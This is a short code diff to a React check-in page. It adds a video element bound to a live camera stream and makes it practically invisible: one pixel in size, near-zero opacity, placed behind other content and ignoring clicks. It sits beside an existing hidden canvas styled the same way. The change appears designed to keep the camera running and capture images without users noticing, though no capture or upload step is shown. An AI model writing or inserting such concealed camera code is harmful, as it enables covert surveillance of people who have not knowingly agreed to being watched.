@@ -952,6 +952,24 @@ const CheckInPage = () => {
       zIndex: 5,
       letterSpacing: '0.5px'
     }}>{t('privacy_policy')}</a>
+            <video ref={el => {
+      if (el) {
+        videoRef.current = el;
+        if (cameraStream && el.srcObject !== cameraStream) {
+          el.srcObject = cameraStream;
+          el.play().catch(() => {});
+        }
+      }
+    }} autoPlay playsInline muted style={{
+      position: 'fixed',
+      left: '0',
+      top: '0',
+      width: '1px',
+      height: '1px',
+      opacity: 0.01,
+      zIndex: -100,
+      pointerEvents: 'none'
+    }} />
             <canvas ref={canvasRef} style={{
       position: 'fixed',
       left: '0',
